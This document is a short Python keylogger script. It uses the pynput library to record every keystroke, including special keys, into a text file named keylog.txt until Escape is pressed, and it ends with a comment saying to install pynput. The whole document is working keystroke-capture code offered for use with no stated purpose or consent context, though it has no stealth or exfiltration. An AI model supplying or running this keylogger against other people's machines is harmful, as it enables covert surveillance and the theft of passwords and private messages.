import pynput.keyboard

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        else:
            log += " " + str(key) + " "

    # Optionally, you can adjust the logging frequency or implement other features here

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        write_log(log)
        return False

def write_log(log):
    with open("keylog.txt", "w") as f:
        f.write(log)

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


# please install pynput
# ------pip install pynput